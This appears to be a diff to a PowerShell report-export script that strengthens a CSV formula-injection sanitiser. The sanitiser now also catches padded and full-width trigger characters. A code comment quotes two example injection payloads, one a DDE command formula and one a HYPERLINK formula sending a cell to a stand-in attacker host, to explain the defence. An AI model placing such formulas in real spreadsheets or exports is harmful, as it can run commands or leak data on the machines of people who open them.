@@ -215,15 +215,39 @@ function Get-ChangeNote {
 }
 
 function Protect-CsvInjection {
+    # CSV/formula injection. A display name of "=cmd|'/c calc'!A1" or
+    # "=HYPERLINK(""http://attacker/""&A1,""Click"")" executes when the report is opened in
+    # Excel, exfiltrating the row it sits next to. Display names are attacker-influenceable
+    # in tenants that allow self-service profile edits or B2B invites, and this report is
+    # specifically a file that a manager will open in Excel. Prefixing the value with a
+    # single quote makes Excel treat it as literal text.
+    #
+    # The trigger is looked for past any leading whitespace or control characters, and in
+    # its full-width forms (U+FF1D, U+FF0B, U+FF0D, U+FF20) as well. That part is
+    # precautionary: LibreOffice 24.2 was observed to evaluate only an unpadded "=", and
+    # Excel's handling of padded or full-width triggers has not been verified. A value is
+    # only ever prefixed, never altered, so nothing a reader needs is lost.
+    #
+    # Applied at export time only, so in-memory objects stay pristine for the HTML path,
+    # which has its own encoding. Identical copies live in the sweep and the comparison
+    # script; tests/Sanitization.Tests.ps1 keeps them identical.
     param([Parameter(ValueFromPipeline)][object]$InputObject)
 
     process {
+        $triggers = @('=', '+', '-', '@', [char]0xFF1D, [char]0xFF0B, [char]0xFF0D, [char]0xFF20)
         $clone = [ordered]@{}
         foreach ($property in $InputObject.PSObject.Properties) {
             $value = $property.Value
-            if ($value -is [string] -and $value.Length -gt 0 -and
-                $value[0] -in @('=', '+', '-', '@', [char]9, [char]13)) {
-                $value = "'" + $value
+            if ($value -is [string] -and $value.Length -gt 0) {
+                $lead = $null
+                foreach ($character in $value.ToCharArray()) {
+                    if (-not ([char]::IsWhiteSpace($character) -or [char]::IsControl($character))) { $lead = $character; break }
+                }
+                $startsHidden = [char]::IsWhiteSpace($value[0]) -or [char]::IsControl($value[0])
+                if ($value[0] -in $triggers -or $value[0] -in @([char]9, [char]10, [char]13) -or
+                    ($startsHidden -and $null -ne $lead -and $lead -in $triggers)) {
+                    $value = "'" + $value
+                }
             }
             $clone[$property.Name] = $value
         }
